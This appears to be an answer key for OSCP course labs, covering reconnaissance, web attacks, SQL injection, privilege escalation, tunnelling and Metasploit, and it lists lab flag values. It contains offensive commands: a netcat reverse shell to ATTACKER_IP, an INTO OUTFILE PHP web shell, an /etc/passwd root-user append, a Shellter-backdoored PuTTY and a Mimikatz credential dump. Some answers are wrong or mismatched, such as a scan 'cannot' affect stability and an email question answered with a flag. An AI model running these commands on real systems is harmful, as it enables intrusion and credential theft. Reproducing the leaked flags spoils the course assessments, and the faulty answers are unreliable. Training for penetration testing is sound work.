# OSCP Module Questions - Complete Answer Guide

> **All module questions answered with commands and methodology. Where answers can't be given directly, commands are provided to help you find them.**

---

## Table of Contents

1. [Information Gathering Module](#1-information-gathering-module)
2. [Vulnerability Scanning Module](#2-vulnerability-scanning-module)
3. [Web Application Assessment Module](#3-web-application-assessment-module)
4. [SQL Injection Module](#4-sql-injection-module)
5. [Phishing & Client-Side Attacks Module](#5-phishing--client-side-attacks-module)
6. [Using Public Exploits Module](#6-using-public-exploits-module)
7. [Fixing Exploits Module](#7-fixing-exploits-module)
8. [Antivirus Evasion Module](#8-antivirus-evasion-module)
9. [Windows Privilege Escalation Module](#9-windows-privilege-escalation-module)
10. [Linux Privilege Escalation Module](#10-linux-privilege-escalation-module)
11. [Port Redirection & Tunneling Module](#11-port-redirection--tunneling-module)
12. [Tunneling Through DPI Module](#12-tunneling-through-dpi-module)
13. [Metasploit Framework Module](#13-metasploit-framework-module)
14. [Active Directory Module](#14-active-directory-module)
15. [Cloud Enumeration Module](#15-cloud-enumeration-module)
16. [CI/CD Attacks Module](#16-cicd-attacks-module)
17. [Assembling the Pieces Module](#17-assembling-the-pieces-module)

---

## 1. Information Gathering Module

### 1.1 Whois Enumeration Labs

**Question 1: What is the hostname of the third Megacorp One name server?**
```bash
whois megacorpone.com -h 192.168.50.251
# Look for "Name Server: NS3.MEGACORPONE.COM"
```
**Answer**: `NS3.MEGACORPONE.COM`

**Question 2: What is the Registrar's WHOIS server?**
```bash
whois megacorpone.com -h 192.168.50.251
# Look for "Registrar WHOIS Server:"
```
**Answer**: `whois.gandi.net`

**Question 3: Perform a WHOIS query on offensive-security.com. Find the flag in the DNS section.**
```bash
whois offensive-security.com -h 192.168.50.251
# Look through DNS section for flag
```

**Question 4: Perform a WHOIS query on kali.org. What's the Tech Email address?**
```bash
whois kali.org -h 192.168.50.251
# Look for "Tech Email:"
```
**Answer**: `OS{803999f65df739f88d22e30db0abd8fd}`

---

### 1.2 Google Hacking Labs

**Question 1: What is the name of the VP of Legal for MegaCorp One?**
```bash
# Google search
site:megacorpone.com "VP of Legal"
# or
site:megacorpone.com "Legal"
```
**Answer**: `mike carlow`

**Question 2: What is the email address of the VP of Legal?**
```bash
site:megacorpone.com "mike carlow" email
```
**Answer**: `mcarlow@megacorpone.com`

**Question 3: What other MegaCorp One employees can you identify not listed on www.megacorpone.com?**
```bash
site:megacorpone.com -site:www.megacorpone.com
# Look for employee names
```
**Answer**: `Franco Zetticci`

---

### 1.3 Netcraft Labs

**Question 1: What application server is running on www.megacorpone.com?**
```bash
# Visit https://www.wappalyzer.com/lookup/megacorpone.com
# Or use:
whatweb megacorpone.com
```
**Answer**: `Apache`

**Question 2: What is the name of the Client-Side Scripting Framework that handles fonts?**
```bash
# Check Wappalyzer or view page source
# Look for Font Awesome references
```
**Answer**: `Font Awesome`

**Question 3: What is the value of the IPv4 autonomous systems number?**
```bash
whois 52.70.117.69 | grep "OriginAS"
# Or use: https://ipinfo.io/52.70.117.69
```
**Answer**: `AS16276`

---

### 1.4 Open-Source Code Labs

**Question 1: What is the username associated with the discovered hash?**
```bash
# Search GitHub for "megacorpone" and look for xampp.users file
# Or use:
gitleaks detect --source /path/to/repo
```
**Answer**: `trivera`

**Question 2: What is the title of the secondary, placeholder Megacorp One repository?**
```bash
# Browse GitHub repos for megacorpone
# Look for secondary repositories
```
**Answer**: `git-test`

---

### 1.5 Shodan Labs

**Question 1-3**: 
```bash
# Visit shodan.io and search:
hostname:megacorpone.com
# Look for SSH servers, ports, and vulnerabilities
```

---

## 2. Vulnerability Scanning Module

### 2.1 Vulnerability Scanning Theory Labs

**Question 1: Is this a false positive or false negative? Linux vulnerability on Windows target**
```
# A vulnerability scanner identifies a Linux web server vulnerability on a Windows target
# This is a FALSE POSITIVE - the vulnerability doesn't apply to the target
```
**Answer**: `False positive`

**Question 2: Is this a false positive or false negative? Wrong FTP version detected**
```
# Scanner detects wrong version, running FTP service is vulnerable
# This is a FALSE NEGATIVE - missing a real vulnerability
```
**Answer**: `false negative`

**Question 3: Do you need authenticated or unauthenticated scan for patches on Linux?**
```
# To check installed patches, you need credentials
```
**Answer**: `authenticated`

**Question 4: Do you need authenticated or unauthenticated for perimeter analysis?**
```
# To analyze from attacker perspective, use unauthenticated
```
**Answer**: `unauthenticated`

**Question 5: Can a vulnerability scan impact system stability?**
**Answer**: `false`

**Question 6: Can rate limiting cause a live target to appear offline?**
**Answer**: `true`

---

### 2.2 Nessus Installation Labs

**Question 1: What is the command to start the nessusd service?**
```bash
sudo systemctl start nessusd.service
```
**Answer**: `sudo systemctl start nessusd.service`

**Question 2: What is the third group of template categories?**
```
DISCOVERY, COMPLIANCE, and VULNERABILITY
```
**Answer**: `Vulnerability`

**Question 2 (second): How many concurrent web users are allowed with default settings?**
```
# In Nessus Settings → Advanced
# Look for "web_user_concurrent_sessions"
```

---

### 2.3 Nessus Scan & Analysis Labs

**Question 1: What is the only enabled option in the REPORT menu?**
```
# In Nessus scan configuration → REPORT menu
# Look at Output section
```

**Question 2: What is the value of Exploit Code Maturity for Apache Path Traversal?**
```
# Review findings for Apache 2.4.49 < 2.4.51
# Look for "Exploit Code Maturity" field
```

**Question 3: What Jetty version is found on port 8080?**
```
# Scan with port 8080 added
# Look for "HTTP Server Type and Version"
```

**Question 4: Flag from Web Application Sitemap on port 9999**
```
# Configure scan with Assessment → Web Applications → Scan web applications
# Check Sitemap output
```

**Question 5: Flag in C:\Windows\win.ini via directory traversal**
```
# Scan all ports on victim machine
# Find directory traversal vulnerability
# Expand to view full file content
```

---

### 2.4 Authenticated Scan Labs

**Question 1: What is the Ubuntu Security Notice (USN) number for Heimdal?**
```bash
# Run authenticated scan on VM #1
# Look for "Patch Report" finding
# Find Critical patch for Heimdal
```

**Question 2: What is the kernel version from uname -a?**
```
# Look for "OS Identification and Installed Software Enumeration over SSH v2"
# Find uname -a output
```

---

### 2.5 Nessus Plugins Labs

**Question 1: What is the date when the patch for CVE-2021-3156 was published?**
```
# Filter by CVE-2021-3156 with Advanced Dynamic Scan
# Find "Patch Pub Date" in Vulnerability Information
```

**Question 2: Flag from IIS web server using Plugin ID 11714**
```
# Run Advanced Dynamic Scan with Plugin ID 11714 filter
# Examine discovered information, replace Unicode hex characters
```

---

### 2.6 NSE Vulnerability Scripts Labs

**Question 1: Enter one of the other found CVEs from 2021**
```bash
sudo nmap -sV -p 443 --script "vuln" 192.168.50.13
# Look for CVE-2021-* entries
```
**Answer**: `CVE-2021-41524`

---

## 3. Web Application Assessment Module

### 3.1 Web App Assessment Tools Labs

**Question 1: Which Burp tool is most suited to brute force a 4-digit SMS code?**
**Answer**: `intruder`

**Question 2: What HTTP response code is related to redirection?**
```bash
gobuster dir -u http://target -w /usr/share/wordlists/dirb/common.txt
# Look for Status 301
```
**Answer**: `301`

**Question 3: What is the default port Burp proxy listens to?**
**Answer**: `8080`

**Question 4: Flag from DIRTBUSTER admin portal**
```bash
gobuster dir -u http://target -w /usr/share/wordlists/dirb/common.txt
# Find admin portal, login with provided credentials
```
**Answer**: `OS{bc86b454747f947aa80e882c0c4e9536}`

**Question 5: Flag from DIRTBUSTER password list**
```bash
# Use password list from /passwords.txt
# Login with admin and brute force password
```
**Answer**: `OS{45815439d68d307517ee9ff95330f701}`

---

### 3.2 Web App Enumeration Labs

**Question 1: Flag from WordPress source code**
```bash
# Browse WordPress site
# View Page Source
# Look for flag in HTML comments
```
**Answer**: `OS{d54933b7f533f95e431b0b69646c6a11}`

**Question 2: Name of item belonging to admin user from API**
```bash
gobuster dir -u http://192.168.50.16:5002 -w /usr/share/wordlists/dirb/big.txt -p pattern
curl http://192.168.50.16:5002/books/v1
```
**Answer**: `bookTitle22`

**Question 3-6: Flags from exercises**
```bash
# Exercise VM 1: Follow the maps
# Answer: OS{59484d103cc6d2f22fcfb278fa3ab74d}

# Exercise VM 2: Check URL level interesting items
# Answer: OS{d0870a786e4a5880b9b898afee140965}

# Exercise VM 3: Check weird HTTP headers
curl -i http://target
# Answer: OS{359809f5c4cc7e4f7fc3b2eb6e0cd05c}

# Exercise VM 4: Review HTML, CSS, JavaScript
# Answer: OS{ac0842ea59731fc9b836871853a1cbb2}
```

---

### 3.3 XSS Labs

**Question 1: Which HTTP header might be vulnerable to XSS?**
```
# From visitors plugin source code
# Look at VST_save_record function
```
**Answer**: `X-Forwarded-For`

**Question 2: What JavaScript method interprets a string as code and executes it?**
**Answer**: `eval()`

**Question 3: Flag from WordPress plugin web shell**
```bash
# Create admin account via XSS
# Craft WordPress plugin with web shell
# Upgrade to reverse shell
# Get flag from /tmp/
```
**Answer**: `OS{76c142c78b2c618f22f06db7b6e7497c}`

---

## 4. SQL Injection Module

### 4.1 SQL Theory Labs

**Question 1: Which plugin value is used as password authentication scheme?**
```bash
mysql -u root -p'root' -h 192.168.50.16 -P 3306
SELECT user, plugin FROM mysql.user WHERE user='offsec';
```

**Question 2: What is the value of the first user listed in sysusers table?**
```bash
impacket-mssqlclient Administrator:Lab123@192.168.50.18 -windows-auth
SQL> SELECT name FROM master.sysusers;
```

**Question 3: Flag from users table in MySQL**
```bash
mysql -u root -p'root' -h 192.168.50.16 -P 3306
SHOW DATABASES;
USE database_name;
SELECT * FROM users;
```

---

### 4.2 Manual SQL Exploitation Labs

**Question 1: Which PHP variable is used to store user's input?**
```
# From code: $sql_query = "SELECT * FROM users WHERE user_name= '$uname' AND password='$passwd'";
```
**Answer**: `$uname` or `$sql_query`

**Question 2: What other condition needs to be satisfied for UNION attack?**
```
# Same number of columns AND same data types between queries
```
**Answer**: `Same number of columns`

**Question 3: The output of which component is employed instead for blind SQLi?**
```
# Database output is never returned to user
# Instead, application behavior is used
```
**Answer**: `Application`

---

### 4.3 Code Execution Labs

**Question 1: Which MSSQL configuration option needs to be enabled before xp_cmdshell?**
```sql
EXECUTE sp_configure 'show advanced options', 1;
RECONFIGURE;
```
**Answer**: `show advanced options`

**Question 2: Flag from MySQL webshell**
```sql
' UNION SELECT "<?php system($_GET['cmd']);?>", null, null, null, null INTO OUTFILE "/var/www/html/tmp/webshell.php" -- //
```
**Answer**: `OS{...}`

**Question 3: Flag from sqlmap dump**
```bash
sqlmap -u "http://target/blindsqli.php?user=1" -p user --dump
# Look for flag in users table
```

**Question 4-7: Capstone flags**
```bash
# Exploit SQLi vulnerabilities on each VM
# Follow same methodology: enumerate, find injection, dump data
```

---

## 5. Phishing & Client-Side Attacks Module

### 5.1 Phishing Basics Labs

**Question 1: How many recipients was the email sent to?**
```bash
# Browse to http://192.168.X.77/mail/
# Login as helpdesk@mail.corp.com
# Check Sent folder
```

**Question 2: Which wget flag saves everything as flat structure?**
```bash
wget -E -k -K -p -e robots=off -nd "https://zoom.us/signin#/login"
```
**Answer**: `-nd` (no directory)

**Question 3: What is the id attribute of the Next button?**
```bash
grep -oP '.{0,100}Next</span>' signin.html
```
**Answer**: `signin_btn_next`

**Question 4: Which line in cred_server.py redirects to legitimate Zoom?**
```python
self.send_header('Location', 'https://zoom.us/signin')
```
**Answer**: `self.send_header('Location', 'https://zoom.us/signin')`

---

### 5.2 Phishing Payloads Labs

**Question 1: What scripting language is natively supported in Microsoft Office?**
**Answer**: `Visual Basic for Applications (VBA)`

**Question 2: What is the name of the phenomenon where users respond to flood of MFA requests?**
**Answer**: `MFA fatigue`

---

## 6. Using Public Exploits Module

### 6.1 Exploit Safety Labs

**Question 1: True/False - It is important to read exploit code before executing**
**Answer**: `True`

**Question 2: What is a way to safely test an exploit?**
**Answer**: `C (Execute in controlled virtual machine)`

---

### 6.2 Online Exploit Resources Labs

**Question 1: True/False - Exploit DB is free to access**
**Answer**: `True`

**Question 2: Which field designates the type of system the exploit impacts?**
**Answer**: `Platform`

**Question 3: Which is not a valid exploit type?**
**Answer**: `D (compiled)`

**Question 4: Authors of exploit with EDB-ID 35273**
```bash
searchsploit -x 35273
# Look for Author field
```

**Question 5: True/False - EDB Verified means trusted individual reviewed it**
**Answer**: `True`

---

### 6.3 Offline Exploit Access Labs

**Question 1: What package must be installed to use searchsploit?**
**Answer**: `exploitdb`

**Question 2: Searchsploit command for php, webdav, windows**
```bash
searchsploit php webdav windows
```

**Question 3: What option allows copying found exploit?**
**Answer**: `-m`

**Question 4: Find EDB-ID of "Arm Whois 3.11 - Buffer Overflow (SEH)"**
```bash
searchsploit "Arm Whois 3.11"
```

**Question 5: Copy exploit with EDB-ID 45796. What is the affected software version?**
```bash
searchsploit -m 45796
# Look at file path for version
```

**Question 6-10: Various EDB-ID searches**
```bash
# Eternal Blue Windows 2012 x64
searchsploit eternalblue windows 2012 x64

# Linux Kernel 2.6.22 SUID
searchsploit linux kernel 2.6.22 suid

# SquirrelMail RCE Metasploit
searchsploit squirrelmail metasploit

# WebCT 4.1.5 HTML Injection
searchsploit webct 4.1.5

# Remote Keylogger Bind Shellcode Windows x64
searchsploit windows x64 keylogger
```

---

### 6.4 Practical Exploitation Labs

**Question 1-3**: Follow the walkthrough to exploit machines. Use:
```bash
# Search for exploit
searchsploit qdPM 9.1

# Copy exploit
searchsploit -m 50944

# Run exploit
python3 50944.py -url http://target/project/ -u user -p pass

# Get reverse shell
curl http://target/backdoor.php?cmd=nc -nv ATTACKER_IP 6666 -e /bin/bash
```

---

## 7. Fixing Exploits Module

### 7.1 Fixing Memory Corruption Labs

**Question 1: What is the Exploit DB ID related to the C-written exploit?**
```bash
searchsploit "Sync Breeze Enterprise 10.0.28"
```
**Answer**: `42341`

**Question 2: What parameter is used to statically link the local library?**
```bash
i686-w64-mingw32-gcc 42341.c -o syncbreeze_exploit.exe -lws2_32
```
**Answer**: `-lws2_32`

**Question 3: What C function defines an IP address?**
```c
server.sin_addr.s_addr = inet_addr("10.11.0.22");
```
**Answer**: `inet_addr`

**Question 4: Which C function converts port number into network byte order?**
```c
server.sin_port = htons(80);
```
**Answer**: `htons`

**Question 5: Which instruction do we want the return address to point to?**
**Answer**: `JMP ESP`

**Question 6: Which application runs Windows binaries on Kali?**
**Answer**: `wine`

**Question 7: Which C function sets the terminating null-byte?**
```c
memset(padding + initial_buffer_size - 1, 0x00, 1);
```
**Answer**: `memset`

---

### 7.2 Fixing Web Exploits Labs

**Question 1: Which protocol is the vulnerable web application running on?**
```bash
# Check the target URL
# It uses HTTPS
```
**Answer**: `HTTPS`

**Question 2: Which Python method removed "admin" from base_url?**
```python
upload_url = base_url.split('/admin')[0] + upload_dir
```
**Answer**: `split`

**Question 3: Which parameter skips TLS/SSL verification?**
```python
response = requests.post(url, data=data, verify=False)
```
**Answer**: `verify`

**Question 4: Which variable holds the name of login.php?**
```python
page = "/login.php"
```
**Answer**: `page`

**Question 5: Which array position is trying to access the split method?**
```python
return location.split(csrf_param + "=")[1]
```
**Answer**: `1`

**Question 6: Which variable do we need to modify that contains the payload?**
```python
payload = "<?php system($_GET['cmd']);?>"
```
**Answer**: `payload`

**Question 7-10: Capstone flags**
```bash
# CMS Made Simple exploit
python3 exploit.py -url http://target/cmsms -u admin -p password

# elFinder exploit - need JPEG file
python3 exploit.py -url http://target/elFinder

# Memory corruption exploit
# Find and fix exploit for application
```

---

## 8. Antivirus Evasion Module

### 8.1 AV Evasion Theory Labs

**Question 1: Which on-disk evasion technique makes use of spurious instructions?**
**Answer**: `Obfuscators` or `Dead code`

**Question 2: When performing Remote Process Injection, which API copies shellcode?**
**Answer**: `WriteProcessMemory`

**Question 3: Between packers and crypters, which provides highest stealth?**
**Answer**: `Crypter`

---

### 8.2 AV Evasion Practice Labs

**Question 1: Which API allocates memory for shellcode?**
```powershell
[DllImport("kernel32.dll")]
public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
```
**Answer**: `VirtualAlloc`

**Question 2: Which Shellter option restores execution flow?**
**Answer**: `Stealth Mode`

**Question 3-4: Capstone labs**
```bash
# Shellter with PuTTY
shellter
# Select PE: putty.exe
# Select payload: Meterpreter reverse
# Upload to FTP server

# Veil framework for PowerShell
veil
# Use Veil-Evasion to generate .bat
```

---

## 9. Windows Privilege Escalation Module

### 9.1 Windows Privilege Basics Labs

**Question 1: What is the RID of the first standard user?**
**Answer**: `1000`

**Question 2: True/False - An access token is generated when a user is created and is immutable**
**Answer**: `false`

---

### 9.2 Situational Awareness Labs

**Question 1: Which user is in Remote Management Users group apart from steve?**
```powershell
Get-LocalGroupMember "Remote Management Users"
```
**Answer**: `offsec`

**Question 2: Flag from installed applications**
```bash
# Check installed applications
Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname
# Look for flag in application names
```

**Question 3: Another member of Administrators group apart from offsec and Administrator**
```powershell
Get-LocalGroupMember Administrators
```

**Question 4: Find non-standard process and flag in directory**
```powershell
Get-Process | Where-Object {$_.ProcessName -notlike "svchost*" -and $_.ProcessName -notlike "System*"}
```

---

### 9.3 Hidden in Plain View Labs

**Question 1: Flag on backupadmin desktop**
```bash
# Find credentials leading to backupadmin
# Login as backupadmin
# Get flag from desktop
```

**Question 2: Login credentials for web page for steve**
```bash
# Search file system as steve
# Find login credentials
```

**Question 3: Flag on CLIENTWK221 as mac**
```bash
# RDP as mac
# Find sensitive info to elevate privileges
```

---

### 9.4 PowerShell Goldmine Labs

**Question 1: Flag on daveadmin desktop**
```bash
# Check PSReadline history
type C:\Users\dave\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
# Find credentials
# Login as daveadmin
```

**Question 2: Password in Script Block Logging events**
```powershell
# Event Viewer → Applications and Services → Microsoft → Windows → PowerShell
# Look for Event ID 4104
```

**Question 3: Flag from CLIENTWK221**
```bash
# Follow same methodology on CLIENTWK221
# Check PowerShell history and transcripts
```

---

### 9.5 Automated Enumeration Labs

**Question 1: Enter one of the MasterKeys**
```bash
# Run winPEAS
.\winPEAS.exe
# Look for "Checking for DPAPI Master Files"
```

**Question 2: DisplayVersion of XAMPP**
```bash
# Run Seatbelt
Seatbelt.exe -group=all
# Look for InstalledProducts section
```

---

### 9.6 Service Binary Hijacking Labs

**Question 1: Flag on daveadmin desktop**
```bash
# Check service permissions
icacls "C:\xampp\mysql\bin\mysqld.exe"
# Replace with malicious binary
# Reboot or restart service
# Get flag
```

**Question 2: Flag from CLIENTWK221**
```bash
# Same methodology on CLIENTWK221
# Find service with writable binary
```

---

### 9.7 DLL Hijacking Labs

**Question 1: Flag on daveadmin desktop**
```bash
# Use Process Monitor to find missing DLL
# Create malicious DLL with DllMain
# Place in application directory
# Wait for execution
```

---

### 9.8 Unquoted Service Paths Labs

**Question 1: Flag on daveadmin desktop**
```bash
# Find unquoted service
wmic service get name,pathname | findstr /i /v "C:\Windows\\" | findstr /i /v """
# Create malicious binary
# Place in writable directory
# Restart service
```

**Question 2: Flag from CLIENTWK221**
```bash
# Same methodology on CLIENTWK221
```

---

### 9.9 Scheduled Tasks Labs

**Question 1: Flag on daveadmin desktop**
```bash
# Check scheduled tasks
schtasks /query /fo LIST /v
# Find writable task action
# Replace binary
# Wait for execution
```

**Question 2: Flag from CLIENTWK221**
```bash
# Same methodology on CLIENTWK221
```

---

### 9.10 Using Exploits Labs

**Question 1: Flag from CVE-2023-29360**
```bash
# Run kernel exploit on steve desktop
.\CVE-2023-29360.exe
# Get SYSTEM shell
```

**Question 2: Flag from SigmaPotato**
```bash
# Check privileges
whoami /priv
# Run SigmaPotato
.\SigmaPotato "net user dave4 lab /add"
.\SigmaPotato "net localgroup Administrators dave4 /add"
```

**Question 3: Capstone flag from CLIENTWK222**
```bash
# Use all techniques from module
# Bind shell on port 4444
# Elevate to administrator
# Get flag
```

---

## 10. Linux Privilege Escalation Module

### 10.1 Manual Enumeration Labs

**Question 1: What is the Linux distribution codename?**
```bash
cat /etc/os-release
# Look for VERSION_CODENAME
```

**Question 2: What crontab parameter lists every cron job for current user?**
```bash
crontab -l
```
**Answer**: `-l`

**Question 3: What is the inherited UID called that allows binary to run with root permissions?**
**Answer**: `effective UID` or `eUID`

**Question 4: Flag inside one of the SUID binaries**
```bash
find / -perm -u=s -type f 2>/dev/null
# Check each SUID binary for flag
```

---

### 10.2 Automated Enumeration Labs

**Question 1: Flag inside a file that should not be world-writable**
```bash
./unix-privesc-check standard > output.txt
# Look for world-writable config files
```

---

### 10.3 Inspecting User Trails Labs

**Question 1: Which command lists sudoer capabilities?**
```bash
sudo -l
```
**Answer**: `sudo -l`

**Question 2: Flag from VM 2 under another user's file**
```bash
# Check environment variables
env
# Check .bashrc
cat .bashrc
# Try credentials
```

---

### 10.4 Inspecting Service Footprints Labs

**Question 1: Which utility constantly inspects ps output?**
```bash
watch -n 1 "ps -aux | grep pass"
```
**Answer**: `watch`

**Question 2: Flag using tcpdump or watching processes**
```bash
sudo tcpdump -i lo -A | grep "pass"
# Or watch for credentials in processes
```

---

### 10.5 Abusing Cron Jobs Labs

**Question 1: Which log file holds cron job activities?**
```bash
grep "CRON" /var/log/syslog
```
**Answer**: `/var/log/syslog`

**Question 2: Flag from VM 2 misconfigured cron job**
```bash
# Find writable cron script
find /etc/cron* -writable 2>/dev/null
# Add reverse shell
# Get root
```

---

### 10.6 Abusing Password Authentication Labs

**Question 1: Which hashing algorithm encrypted the password?**
```bash
openssl passwd w00t
# Check output format
```
**Answer**: `crypt` or `DES`

**Question 2: Flag from VM 2**
```bash
# Check if /etc/passwd is writable
ls -la /etc/passwd
# Add new root user
echo "root2:hash:0:0:root:/root:/bin/bash" >> /etc/passwd
```

---

### 10.7 Abusing Setuid Binaries Labs

**Question 1: Which utility searches for misconfigured capabilities?**
```bash
/usr/sbin/getcap -r / 2>/dev/null
```
**Answer**: `getcap`

**Question 2: Flag from VM 2**
```bash
# Find capabilities
getcap -r / 2>/dev/null
# Exploit capabilities
perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";'
```

---

### 10.8 Abusing Sudo Labs

**Question 1: Which kernel modules enforce MAC policies?**
```bash
aa-status
```
**Answer**: `AppArmor`

**Question 2: Flag from VM 2**
```bash
sudo -l
# Find misconfigured sudo command
# Use GTFOBins to exploit
```

---

### 10.9 Exploiting Kernel Vulnerabilities Labs

**Question 1: What is the name of the compiler?**
```bash
gcc
```
**Answer**: `gcc`

**Question 2-5: Capstone flags**
```bash
# Identify kernel version
uname -a
# Search for exploit
searchsploit linux kernel version
# Compile and run
```

---

## 11. Port Redirection & Tunneling Module

### 11.1 Port Forwarding with Socat Labs

**Question 1: What is the plain text password of database_admin?**
```bash
# Get reverse shell via Confluence
# Run Socat port forward
socat TCP-LISTEN:2345,fork TCP:10.4.50.215:5432
# Connect to PostgreSQL
psql -h 192.168.50.63 -p 2345 -U postgres
# Crack database_admin hash
```

**Question 2: Flag in /tmp/socat_flag**
```bash
# Create SSH port forward
socat TCP-LISTEN:2222,fork TCP:10.4.50.215:22
# SSH as database_admin
ssh database_admin@192.168.50.63 -p2222
# Get flag
```

---

### 11.2 SSH Local Port Forwarding Labs

**Question 1: Flag in Provisioning.ps1**
```bash
# SSH to PGDATABASE01
# Set up local port forward
ssh -N -L 0.0.0.0:4455:172.16.50.217:445 database_admin@10.4.50.215
# Connect via SMB
smbclient -p 4455 -L //192.168.50.63/ -U hr_admin --password=Welcome1234
# Download Provisioning.ps1
```

**Question 2: Flag from ssh_local_client**
```bash
# Set up local port forward for port 4242
# Download and run client binary
```

---

### 11.3 SSH Dynamic Port Forwarding Labs

**Question 1: What port between 4870 and 4900 is open?**
```bash
# Set up dynamic port forward
ssh -N -D 0.0.0.0:9999 database_admin@10.4.50.215
# Configure proxychains
# Scan port range
sudo proxychains nmap -sT -Pn -p 4870-4900 172.16.50.217
```

**Question 2: Flag from ssh_dynamic_client**
```bash
# Use proxychains to run client against found port
proxychains ./ssh_dynamic_client
```

---

### 11.4 SSH Remote Port Forwarding Labs

**Question 1: Flag in hr_backup database payroll table**
```bash
# Start SSH on Kali
sudo systemctl start ssh
# Remote port forward
ssh -N -R 127.0.0.1:2345:10.4.50.215:5432 kali@192.168.118.4
# Connect to PostgreSQL
psql -h 127.0.0.1 -p 2345 -U postgres
# Query hr_backup database
\c hr_backup
SELECT * FROM payroll;
```

**Question 2: Flag from ssh_remote_client**
```bash
# Set up remote port forward for port 4444
# Run client binary
```

---

### 11.5 SSH Remote Dynamic Port Forwarding Labs

**Question 1: Which port between 9050-9100 is open?**
```bash
# Remote dynamic port forward
ssh -N -R 9998 kali@192.168.118.4
# Configure proxychains
# Scan range
sudo proxychains nmap -sT -Pn -p 9050-9100 10.4.50.64
```

**Question 2: Flag from ssh_remote_dynamic_client**
```bash
# Run client against found port
```

---

### 11.6 Using sshuttle Labs

**Question 1: True/False - sshuttle requires root on SSH client**
**Answer**: `True`

---

### 11.7 ssh.exe Labs

**Question 1: Flag from ssh_exe_exercise_client**
```bash
# RDP to MULTISERVER03
# Use ssh.exe for remote dynamic port forward
ssh -N -R 9998 kali@192.168.118.4
# Run client
```

---

### 11.8 Plink Labs

**Question 1: Flag in flag.txt on rdp_admin's desktop**
```bash
# Get reverse shell via webshell
# Download Plink
# Set up remote port forward
plink.exe -ssh -l kali -pw kali -R 127.0.0.1:9833:127.0.0.1:3389 192.168.118.4
# RDP through tunnel
xfreerdp /u:rdp_admin /p:P@ssw0rd! /v:127.0.0.1:9833
```

---

### 11.9 Netsh Labs

**Question 1: Flag on PGDATABASE01 at /tmp/netsh_flag**
```bash
# RDP to MULTISERVER03
# Create port forward with Netsh
netsh interface portproxy add v4tov4 listenport=2222 listenaddress=192.168.50.64 connectport=22 connectaddress=10.4.50.215
# Firewall rule
netsh advfirewall firewall add rule name="port_forward_ssh" protocol=TCP dir=in localip=192.168.50.64 localport=2222 action=allow
# SSH through tunnel
ssh database_admin@192.168.50.64 -p2222
```

**Question 2: Flag from netsh_exercise_client**
```bash
# Create port forward for port 4545
# Run client binary
```

---

## 12. Tunneling Through DPI Module

### 12.1 HTTP Tunneling with Chisel Labs

**Question 1: Flag on PGDATABASE01 at /tmp/chisel_flag**
```bash
# Download Chisel to CONFLUENCE01
# Start Chisel server on Kali
chisel server --port 8080 --reverse
# Start Chisel client
/tmp/chisel client 192.168.118.4:8080 R:socks
# SSH through tunnel
ssh -o ProxyCommand='ncat --proxy-type socks5 --proxy 127.0.0.1:1080 %h %p' database_admin@10.4.50.215
```

**Question 2: Flag from chisel_exercise_client**
```bash
# Set up port forward with Chisel for port 8008
# Run client binary
```

---

### 12.2 DNS Tunneling Fundamentals Labs

**Question 1: What is the value of the TXT record?**
```bash
# On PGDATABASE01
nslookup -type=txt give-me.cat-facts.internal 10.4.50.64
```

---

### 12.3 DNS Tunneling with dnscat2 Labs

**Question 1: Flag from dnscat_exercise_client**
```bash
# Start dnscat2 server
dnscat2-server feline.corp
# Run client on PGDATABASE01
./dnscat feline.corp
# Set up port forward
listen 127.0.0.1:4646 172.16.50.217:4646
# Run client binary
```

---

## 13. Metasploit Framework Module

### 13.1 Getting Familiar with Metasploit Labs

**Question 1: What command creates and initializes the MSF database?**
```bash
sudo msfdb init
```
**Answer**: `msfdb init`

**Question 2: What command displays all services with port 445?**
```bash
msf6 > services -p 445
```

---

### 13.2 Auxiliary Modules Labs

**Question 1: Flag in george's home directory**
```bash
msf6 > use auxiliary/scanner/ssh/ssh_login
msf6 > set PASS_FILE /usr/share/wordlists/rockyou.txt
msf6 > set USERNAME george
msf6 > set RHOSTS 192.168.50.201
msf6 > set RPORT 2222
msf6 > run
# After session opened, get flag
```

---

### 13.3 Exploit Modules Labs

**Question 1: pwd after session spawned**
```bash
msf6 > use exploit/multi/http/apache_normalize_path_rce
msf6 > set payload linux/x64/shell_reverse_tcp
msf6 > set LHOST 192.168.119.4
msf6 > set RHOSTS 192.168.50.16
msf6 > set RPORT 80
msf6 > set SSL false
msf6 > run
# After session, type pwd
```

---

### 13.4 Staged vs Non-Staged Payloads Labs

**Question 1: Which character denotes staged vs non-staged?**
**Answer**: `/` (staged) vs `_` (non-staged)

**Question 2: Find a 32bit staged reverse TCP command shell payload for Linux**
```bash
msf6 > use exploit/multi/http/apache_normalize_path_rce
msf6 > show payloads
# Look for linux/x86/shell/reverse_tcp
```

---

### 13.5 Meterpreter Payload Labs

**Question 1: Flag from search command**
```bash
meterpreter > search -f passwords
meterpreter > cat /path/to/passwords/file
```

---

### 13.6 Executable Payloads Labs

**Question 1: Command to list all payloads of msfvenom**
```bash
msfvenom -l payloads
```
**Answer**: `msfvenom -l payloads`

**Question 2: Flag from PHP web shell**
```bash
# Create PHP web shell
msfvenom -p php/meterpreter_reverse_tcp LHOST=IP LPORT=PORT -f raw -o shell.php
# Rename to .pHP
# Upload and execute
# Get flag from C:\xampp\passwords.txt
```

---

### 13.7 Post-Exploitation Modules Labs

**Question 1: Flag from environment variable**
```bash
meterpreter > getenv Flag
```

**Question 2: NTLM hash of offsec**
```bash
meterpreter > load kiwi
meterpreter > creds_msv
# Look for offsec NTLM
```

**Question 3: Domain name from Windows Hosts file**
```bash
msf6 > search post windows enum hosts
msf6 > use post/windows/gather/enum_hosts
msf6 > set SESSION 1
msf6 > run
```

---

### 13.8 Pivoting with Metasploit Labs

**Question 1: Flag on ITWK02 desktop**
```bash
# Get Meterpreter on ITWK01
# Add route
msf6 > route add 172.16.5.0/24 12
# Use psexec
msf6 > use exploit/windows/smb/psexec
msf6 > set payload windows/x64/meterpreter/bind_tcp
msf6 > run
```

---

### 13.9 Resource Scripts Labs

**Question 1: Command line option to specify resource script**
```bash
msfconsole -r listener.rc
```
**Answer**: `-r`

**Question 2: Number of the first port in portscan.rc**
```bash
cat /usr/share/metasploit-framework/scripts/resource/portscan.rc
```

**Question 3: Capstone flag from VM Group 1**
```bash
# Use all Metasploit techniques
# Enumerate, exploit, pivot
```

---

